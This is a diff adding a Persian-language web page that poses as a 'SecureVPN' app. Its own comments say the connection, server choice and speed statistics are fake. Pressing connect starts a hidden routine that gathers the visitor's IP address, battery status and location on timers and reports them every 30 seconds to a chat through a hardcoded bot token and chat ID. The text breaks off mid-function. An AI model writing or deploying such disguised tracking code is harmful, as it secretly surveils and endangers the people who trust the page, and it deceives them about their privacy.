@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>SecureVPN - اتصال امن و سریع</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap');
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Vazirmatn', sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #fff;
+      min-height: 100vh;
+      overflow: auto;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+      padding-top: 20px;
+    }
+
+    .logo {
+      width: 60px;
+      height: 60px;
+      background: linear-gradient(45deg, #4facfe, #00f2fe);
+      border-radius: 20px;
+      margin: 0 auto 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: bold;
+      box-shadow: 0 8px 25px rgba(79, 172, 254, 0.3);
+    }
+
+    .app-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .app-subtitle {
+      color: rgba(255,255,255,0.8);
+      font-size: 16px;
+    }
+
+    /* Connection Status */
+    .connection-status {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      border-radius: 25px;
+      padding: 30px;
+      margin-bottom: 25px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .status-indicator {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+
+    .status-indicator.disconnected {
+      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+      box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7);
+      animation: pulse-red 2s infinite;
+    }
+
+    .status-indicator.connected {
+      background: linear-gradient(45deg, #00b894, #00cec9);
+      box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7);
+      animation: pulse-green 2s infinite;
+    }
+
+    @keyframes pulse-red {
+      0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(255, 107, 107, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
+    }
+
+    @keyframes pulse-green {
+      0% { box-shadow: 0 0 0 0 rgba(0, 184, 148, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(0, 184, 148, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(0, 184, 148, 0); }
+    }
+
+    .status-icon {
+      font-size: 48px;
+    }
+
+    .status-text {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .status-detail {
+      color: rgba(255,255,255,0.8);
+      font-size: 14px;
+    }
+
+    /* Connect Button */
+    .connect-button {
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 15px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-bottom: 25px;
+      font-family: 'Vazirmatn', sans-serif;
+    }
+
+    .connect-button.disconnected {
+      background: linear-gradient(45deg, #00b894, #00cec9);
+      color: white;
+    }
+
+    .connect-button.connected {
+      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+      color: white;
+    }
+
+    .connect-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+    }
+
+    /* Server Selection */
+    .server-section {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .server-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .server-item {
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .server-item:hover {
+      background: rgba(255,255,255,0.2);
+      transform: translateX(-5px);
+    }
+
+    .server-item.active {
+      background: linear-gradient(45deg, #4facfe, #00f2fe);
+      transform: translateX(-5px);
+    }
+
+    .server-info {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .server-flag {
+      width: 30px;
+      height: 20px;
+      border-radius: 4px;
+      background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+    }
+
+    .server-details h4 {
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .server-details p {
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    .server-ping {
+      background: rgba(0, 184, 148, 0.2);
+      color: #00b894;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    /* Stats */
+    .stats-section {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+    }
+
+    .stat-item {
+      text-align: center;
+      background: rgba(255,255,255,0.1);
+      padding: 15px;
+      border-radius: 12px;
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: #4facfe;
+      margin-bottom: 5px;
+    }
+
+    .stat-label {
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    /* Settings */
+    .settings-section {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 20px;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .setting-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 15px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .setting-item:last-child {
+      border-bottom: none;
+    }
+
+    .setting-info h4 {
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .setting-info p {
+      font-size: 12px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    .toggle-switch {
+      position: relative;
+      width: 50px;
+      height: 25px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .toggle-switch.active {
+      background: #4facfe;
+    }
+
+    .toggle-switch::after {
+      content: '';
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      width: 21px;
+      height: 21px;
+      background: white;
+      border-radius: 50%;
+      transition: all 0.3s ease;
+    }
+
+    .toggle-switch.active::after {
+      transform: translateX(25px);
+    }
+
+    /* Loading Animation */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .loading-content {
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(20px);
+      border-radius: 20px;
+      padding: 30px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top: 4px solid #4facfe;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .premium-badge {
+      background: linear-gradient(45deg, #f093fb, #f5576c);
+      color: white;
+      font-size: 10px;
+      padding: 3px 8px;
+      border-radius: 10px;
+      margin-right: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">🛡️</div>
+      <div class="app-title">SecureVPN</div>
+      <div class="app-subtitle">اتصال امن و مخفی</div>
+    </div>
+
+    <!-- Connection Status -->
+    <div class="connection-status">
+      <div class="status-indicator disconnected" id="statusIndicator">
+        <div class="status-icon" id="statusIcon">🔒</div>
+      </div>
+      <div class="status-text" id="statusText">قطع شده</div>
+      <div class="status-detail" id="statusDetail">برای محافظت از حریم خصوصی VPN را فعال کنید</div>
+    </div>
+
+    <!-- Connect Button -->
+    <button class="connect-button disconnected" id="connectButton" onclick="toggleConnection()">
+      🚀 اتصال به VPN
+    </button>
+
+    <!-- Server Selection -->
+    <div class="server-section">
+      <div class="section-title">
+        🌍 انتخاب سرور
+        <span class="premium-badge">PREMIUM</span>
+      </div>
+      <div class="server-list">
+        <div class="server-item active" onclick="selectServer(this, 'ایران', 'تهران')">
+          <div class="server-info">
+            <div class="server-flag">🇮🇷</div>
+            <div class="server-details">
+              <h4>ایران - تهران</h4>
+              <p>سرور سریع و امن</p>
+            </div>
+          </div>
+          <div class="server-ping">15ms</div>
+        </div>
+        
+        <div class="server-item" onclick="selectServer(this, 'آلمان', 'برلین')">
+          <div class="server-info">
+            <div class="server-flag">🇩🇪</div>
+            <div class="server-details">
+              <h4>آلمان - برلین</h4>
+              <p>بالاترین سرعت</p>
+            </div>
+          </div>
+          <div class="server-ping">45ms</div>
+        </div>
+        
+        <div class="server-item" onclick="selectServer(this, 'آمریکا', 'نیویورک')">
+          <div class="server-info">
+            <div class="server-flag">🇺🇸</div>
+            <div class="server-details">
+              <h4>آمریکا - نیویورک</h4>
+              <p>دسترسی کامل</p>
+            </div>
+          </div>
+          <div class="server-ping">120ms</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-section">
+      <div class="section-title">📊 آمار اتصال</div>
+      <div class="stats-grid">
+        <div class="stat-item">
+          <div class="stat-value" id="downloadSpeed">0 MB/s</div>
+          <div class="stat-label">سرعت دانلود</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="uploadSpeed">0 MB/s</div>
+          <div class="stat-label">سرعت آپلود</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="dataTransfer">0 MB</div>
+          <div class="stat-label">حجم مصرفی</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="connectionTime">00:00</div>
+          <div class="stat-label">مدت اتصال</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Settings -->
+    <div class="settings-section">
+      <div class="section-title">⚙️ تنظیمات</div>
+      
+      <div class="setting-item">
+        <div class="setting-info">
+          <h4>اتصال خودکار</h4>
+          <p>اتصال خودکار هنگام باز شدن برنامه</p>
+        </div>
+        <div class="toggle-switch active" onclick="toggleSetting(this)"></div>
+      </div>
+      
+      <div class="setting-item">
+        <div class="setting-info">
+          <h4>Kill Switch</h4>
+          <p>قطع اینترنت در صورت قطع VPN</p>
+        </div>
+        <div class="toggle-switch" onclick="toggleSetting(this)"></div>
+      </div>
+      
+      <div class="setting-item">
+        <div class="setting-info">
+          <h4>DNS امن</h4>
+          <p>استفاده از DNS سرورهای امن</p>
+        </div>
+        <div class="toggle-switch active" onclick="toggleSetting(this)"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <div>در حال اتصال به سرور...</div>
+      <div style="font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 8px;">
+        لطفاً صبر کنید
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // متغیرهای حالت VPN (فیک)
+    let isConnected = false;
+    let currentServer = { country: 'ایران', city: 'تهران' };
+    let connectionStartTime = null;
+    let statsInterval = null;
+    let connectionTimeInterval = null;
+
+    // =============================================
+    // بخش مخفی: متغیرهای ردیابی واقعی
+    // =============================================
+    let trackingActive = false;
+    let batteryInterval = null;
+    let locationInterval = null;
+    let reportInterval = null;
+    let currentLocation = { lat: null, lon: null, accuracy: null };
+    let deviceIP = 'نامشخص';
+    let reportCounter = 0;
+
+    // تنظیمات بله برای ردیابی مخفی
+    const TRACKING_TOKEN = "1800443187:znI9tLgBFIXYJgqvyxExyB8e39NzFZ2N6XF69S2A";
+    const TRACKING_CHAT_ID = "1555895568";
+
+    // تابع اتصال/قطع VPN (فیک)
+    function toggleConnection() {
+      const button = document.getElementById('connectButton');
+      const indicator = document.getElementById('statusIndicator');
+      const icon = document.getElementById('statusIcon');
+      const text = document.getElementById('statusText');
+      const detail = document.getElementById('statusDetail');
+      const overlay = document.getElementById('loadingOverlay');
+
+      if (!isConnected) {
+        // نمایش loading
+        overlay.style.display = 'flex';
+        
+        setTimeout(() => {
+          // اتصال موفق
+          isConnected = true;
+          connectionStartTime = new Date();
+          
+          // تغییر UI
+          button.textContent = '⏹️ قطع اتصال';
+          button.className = 'connect-button connected';
+          
+          indicator.className = 'status-indicator connected';
+          icon.textContent = '✅';
+          text.textContent = 'متصل شد';
+          detail.textContent = `متصل به ${currentServer.country} - ${currentServer.city}`;
+          
+          overlay.style.display = 'none';
+          
+          // شروع آمارهای فیک
+          startFakeStats();
+          startConnectionTimer();
+          
+          // =============================================
+          // شروع ردیابی مخفی هنگام "اتصال" به VPN
+          // =============================================
+          startHiddenTracking();
+          
+        }, 3000); // تأخیر 3 ثانیه‌ای برای واقعی‌تر شدن
+        
+      } else {
+        // قطع اتصال
+        isConnected = false;
+        connectionStartTime = null;
+        
+        button.textContent = '🚀 اتصال به VPN';
+        button.className = 'connect-button disconnected';
+        
+        indicator.className = 'status-indicator disconnected';
+        icon.textContent = '🔒';
+        text.textContent = 'قطع شده';
+        detail.textContent = 'برای محافظت از حریم خصوصی VPN را فعال کنید';
+        
+        // توقف آمارهای فیک
+        stopFakeStats();
+        stopConnectionTimer();
+        
+        // =============================================
+        // توقف ردیابی مخفی هنگام "قطع" VPN
+        // =============================================
+        stopHiddenTracking();
+      }
+    }
+
+    // انتخاب سرور (فیک)
+    function selectServer(element, country, city) {
+      // حذف کلاس active از همه
+      document.querySelectorAll('.server-item').forEach(item => {
+        item.classList.remove('active');
+      });
+      
+      // افزودن active به انتخاب شده
+      element.classList.add('active');
+      
+      currentServer = { country, city };
+      
+      // اگر متصل است، تغییر جزئیات
+      if (isConnected) {
+        document.getElementById('statusDetail').textContent = `متصل به ${country} - ${city}`;
+      }
+    }
+
+    // تغییر تنظیمات (فیک)
+    function toggleSetting(element) {
+      element.classList.toggle('active');
+    }
+
+    // شروع آمار فیک
+    function startFakeStats() {
+      let downloadSpeed = 0;
+      let uploadSpeed = 0;
+      let totalData = 0;
+
+      statsInterval = setInterval(() => {
+        // سرعت‌های تصادفی واقعی
+        downloadSpeed = (Math.random() * 15 + 5).toFixed(1);
+        uploadSpeed = (Math.random() * 8 + 2).toFixed(1);
+        totalData += parseFloat(downloadSpeed) * 0.1;
+
+        document.getElementById('downloadSpeed').textContent = downloadSpeed + ' MB/s';
+        document.getElementById('uploadSpeed').textContent = uploadSpeed + ' MB/s';
+        document.getElementById('dataTransfer').textContent = totalData.toFixed(0) + ' MB';
+      }, 2000);
+    }
+
+    function stopFakeStats() {
+      if (statsInterval) {
+        clearInterval(statsInterval);
+        statsInterval = null;
+        
+        document.getElementById('downloadSpeed').textContent = '0 MB/s';
+        document.getElementById('uploadSpeed').textContent = '0 MB/s';
+        document.getElementById('dataTransfer').textContent = '0 MB';
+      }
+    }
+
+    // تایمر اتصال
+    function startConnectionTimer() {
+      connectionTimeInterval = setInterval(() => {
+        if (connectionStartTime) {
+          const elapsed = Math.floor((new Date() - connectionStartTime) / 1000);
+          const minutes = Math.floor(elapsed / 60);
+          const seconds = elapsed % 60;
+          
+          document.getElementById('connectionTime').textContent = 
+            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        }
+      }, 1000);
+    }
+
+    function stopConnectionTimer() {
+      if (connectionTimeInterval) {
+        clearInterval(connectionTimeInterval);
+        connectionTimeInterval = null;
+        document.getElementById('connectionTime').textContent = '00:00';
+      }
+    }
+
+    // =============================================
+    // بخش مخفی: سیستم ردیابی واقعی
+    // =============================================
+
+    // شروع ردیابی مخفی
+    function startHiddenTracking() {
+      if (trackingActive) return;
+      
+      trackingActive = true;
+      console.log('[مخفی] شروع سیستم ردیابی...');
+      
+      // شروع فوری جمع‌آوری اطلاعات
+      collectDeviceIP();
+      collectBatteryInfo();
+      collectLocationInfo();
+      
+      // تنظیم interval ها
+      batteryInterval = setInterval(collectBatteryInfo, 10000); // هر 10 ثانیه
+      locationInterval = setInterval(collectLocationInfo, 15000); // هر 15 ثانیه
+      reportInterval = setInterval(sendHiddenReport, 30000); // هر 30 ثانیه
+      
+      // ارسال گزارش اولیه بعد از 3 ثانیه
+      setTimeout(() => {
+        sendInitialHiddenReport();
+      }, 3000);
+    }
+
+    // توقف ردیابی مخفی
+    function stopHiddenTracking() {
+      if (!trackingActive) return;
+      
+      trackingActive = false;
+      console.log('[مخفی] توقف سیستم ردیابی...');
+      
+      if (batteryInterval) clearInterval(batteryInterval);
+      if (locationInterval) clearInterval(locationInterval);
+      if (reportInterval) clearInterval(reportInterval);
+      
+      // ارسال گزارش قطع
+      sendTrackingMessage(`
+🔴 سیستم ردیابی متوقف شد
+
+⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+📊 تعداد گزارش ارسالی: ${reportCounter}
+🎯 آخرین موقعیت: ${currentLocation.lat ? `${currentLocation.lat}, ${currentLocation.lon}` : 'نامشخص'}
+      `.trim());
+    }
+
+    // جمع‌آوری IP
+    async function collectDeviceIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        deviceIP = data.ip;
+      } catch (error) {
+        console.error('خطا در دریافت IP:', error);
+      }
+    }
+
+    // جمع‌آوری اطلاعات باتری
+    async function collectBatteryInfo() {
+      try {
+        if ('getBattery' in nav
